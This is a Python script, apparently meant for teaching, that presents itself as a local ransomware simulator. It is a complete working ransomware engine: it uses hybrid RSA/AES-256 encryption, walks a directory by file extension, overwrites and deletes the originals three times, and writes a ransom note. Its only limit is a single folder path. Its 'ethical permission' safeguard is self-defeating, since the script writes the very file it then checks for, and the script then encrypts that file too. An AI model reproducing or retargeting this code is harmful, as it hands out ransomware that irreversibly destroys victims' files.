# Import necessary libraries
import os  # For interacting with the operating system, like file paths and directory creation
import sys  # For system-specific parameters and functions, like exiting the script
import secrets  # For generating cryptographically strong random numbers (used for keys and IVs)
from datetime import datetime  # For getting the current date and time
from cryptography.hazmat.primitives import serialization, hashes, padding as sym_padding  # Core cryptography primitives
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding  # For RSA asymmetric cryptography
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # For AES symmetric cryptography
from cryptography.hazmat.backends import default_backend  # Specifies the cryptography backend to use

### 🔐 CONFIGURATION ###
# Get the absolute path of the directory where the script is located
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
# Define a dedicated test directory within the script's directory for the simulation
TEST_DIR = os.path.join(SCRIPT_DIR, "RANSOMWARE_SIMULATION_TEST")
# List of file extensions to target for encryption
TARGET_EXTENSIONS = [".txt", ".docx", ".pdf", ".jpg"]
# The name of the ransom note file that will be created
RANSOM_NOTE = "LEGGIMI_DECRIPTARE.txt"  # "READ_ME_TO_DECRYPT.txt"

### 🛡️ ETHICAL CHECKS ###
def verifica_ambiente_sicuro():
    """
    Checks for the presence of a "permission file" to ensure the script
    is run intentionally in a safe, controlled environment.
    This prevents accidental execution in an unintended directory.
    """
    if not os.path.exists(os.path.join(TEST_DIR, "PERMESSO_ETICO.txt")):
        # If the safety file is missing, print an error and exit.
        print("⛔ SAFETY FILE MISSING! Create 'PERMESSO_ETICO.txt' in the test folder.")
        sys.exit(1)

def crea_permesso_etico():
    """
    Creates the safety file that authorizes the script's execution.
    This file logs the user and timestamp, confirming the educational intent.
    """
    # The file is named "PERMESSO_ETICO.txt" which means "ETHICAL_PERMISSION.txt"
    with open(os.path.join(TEST_DIR, "PERMESSO_ETICO.txt"), "w") as f:
        f.write("⚠️ ATTENZIONE: USO DIDATTICO ⚠️\n") # "WARNING: EDUCATIONAL USE"
        f.write(f"Utente: {os.getlogin()}\n") # "User:"
        f.write(f"Data: {datetime.now().isoformat()}\n") # "Date:"
        f.write("Autorizzo l'uso di questo script per scopi educativi.\n") # "I authorize the use of this script for educational purposes."

### 📄 TEST FILE CREATION ###
def crea_file_di_test():
    """
    Creates a simple dummy file to be used as a target for encryption.
    """
    test_file = os.path.join(TEST_DIR, "test.txt")
    with open(test_file, "w") as f:
        f.write("file di test da criptare") # "test file to be encrypted"
    print(f"📄 Created test file: {test_file}")

### 🔑 KEY GENERATION ###
def genera_chiavi_rsa():
    """
    Generates a 2048-bit RSA public/private key pair.
    This is a standard asymmetric encryption setup. The public key encrypts,
    and only the corresponding private key can decrypt.
    """
    # Generate the private key
    private_key = rsa.generate_private_key(
        public_exponent=65537,  # A standard, commonly used public exponent
        key_size=2048,          # A secure key size for RSA
        backend=default_backend()
    )

    # Save the private key to a .pem file. This key would be kept by the "attacker".
    with open(os.path.join(TEST_DIR, "private_key.pem"), "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()  # The key file itself is not password-protected
        ))

    # Return the public key object, which will be used to encrypt the symmetric (AES) key
    return private_key.public_key()

### 🔒 FILE ENCRYPTION ###
def cifra_file_aes(file_path, aes_key):
    """
    Encrypts a single file using AES-256 in CBC mode.
    AES is a symmetric algorithm, meaning the same key is used for encryption and decryption.
    """
    # Generate a random 16-byte Initialization Vector (IV).
    # The IV is required for CBC mode to ensure that encrypting the same data twice results in different ciphertext.
    iv = secrets.token_bytes(16)
    # Create an AES cipher object with the provided key, in CBC mode with the generated IV.
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())

    # Read the original file's binary content.
    with open(file_path, "rb") as f:
        original_data = f.read()

    # AES works on fixed-size blocks (128 bits). PKCS7 padding is used to ensure
    # the final block of data is the correct size.
    padder = sym_padding.PKCS7(128).padder()
    padded_data = padder.update(original_data) + padder.finalize()

    # Create an encryptor object from the cipher.
    encryptor = cipher.encryptor()
    # Encrypt the padded data.
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Write the encrypted data to a new file with a ".encrypted" extension.
    # The IV is prepended to the ciphertext so it's available for decryption.
    with open(file_path + ".encrypted", "wb") as f:
        f.write(iv + encrypted_data)

    # Securely delete the original file.
    sovrascrivi_e_cancella(file_path)

def sovrascrivi_e_cancella(file_path):
    """
    Securely overwrites a file with random data three times before deleting it.
    This makes recovery of the original file data much more difficult.
    """
    try:
        # Open the file in binary append+read mode to get its size.
        with open(file_path, "ba+") as f:
            length = f.tell()
            # Loop three times for a more secure overwrite.
            for _ in range(3):
                f.seek(0)  # Rewind to the beginning of the file.
                f.write(secrets.token_bytes(length)) # Overwrite with random bytes.
        # After overwriting, remove the file from the filesystem.
        os.remove(file_path)
    except Exception as e:
        print(f"❌ Error during secure deletion of {file_path}: {e}")

### 📜 RANSOM NOTE ###
def crea_ransom_note():
    """
    Generates the ransom note file with simulated instructions.
    """
    # The text content of the ransom note.
    text = f"""⚠️ ATTENZIONE! I TUOI FILE SONO STATI CRIPTATI! ⚠️

Questo è un esperimento didattico. Per decifrare:
1. Usa 'private_key.pem' e 'mydecrypt.py'
2. NON DISTRUGGERE I FILE .encrypted

🔐 Ricorda: questo è solo per studio della sicurezza!
"""
    # "WARNING! YOUR FILES HAVE BEEN ENCRYPTED!"
    # "This is an educational experiment. To decrypt:"
    # "1. Use 'private_key.pem' and 'mydecrypt.py'"
    # "2. DO NOT DESTROY THE .encrypted FILES"
    # "Remember: this is only for security studies!"
    with open(os.path.join(TEST_DIR, RANSOM_NOTE), "w") as f:
        f.write(text)

### 🚀 MAIN ###
if __name__ == "__main__":
    print("=== RANSOMWARE SIMULATOR (LOCAL) ===")
    print(f"📁 Test folder: {TEST_DIR}")

    # Check if the test directory already exists.
    if os.path.exists(TEST_DIR):
        print("⚠️ WARNING: The test folder already exists!")
        choice = input("Do you want to continue and overwrite existing files? (y/n): ").lower()
        if choice != 'y':
            print("Operation cancelled.")
            sys.exit(0)
    else:
        # If it doesn't exist, create it.
        os.makedirs(TEST_DIR)
        print("✅ Test folder created")

    # Create the ethical permission file and then verify it.
    crea_permesso_etico()
    verifica_ambiente_sicuro()

    # Create a dummy file to encrypt.
    crea_file_di_test()

    # Generate a single, strong 256-bit (32-byte) symmetric AES key.
    # This key will be used to encrypt all the target files.
    aes_key = secrets.token_bytes(32)

    # Use a hybrid encryption scheme:
    # 1. Generate an RSA key pair.
    public_key = genera_chiavi_rsa()
    # 2. Encrypt the single AES key using the RSA public key.
    # OAEP padding is a modern, secure padding scheme for RSA.
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted AES key to a file. To decrypt the files, an attacker
    # would need the RSA private key to first decrypt this file and get the AES key.
    with open(os.path.join(TEST_DIR, "encrypted_aes_key.bin"), "wb") as f:
        f.write(encrypted_aes_key)

    # Walk through all files in the test directory.
    for root, _, files in os.walk(TEST_DIR):
        for file in files:
            # Check if the file's extension is in our target list.
            if any(file.endswith(ext) for ext in TARGET_EXTENSIONS):
                file_path = os.path.join(root, file)
                print(f"🔒 Encrypting {file}...")
                # Encrypt the file using the (in-memory) AES key.
                cifra_file_aes(file_path, aes_key)

    # Create the ransom note in the test directory.
    crea_ransom_note()
    print("\n💀 SIMULATION COMPLETE!")
    print(f"📜 Read the instructions in: {RANSOM_NOTE}")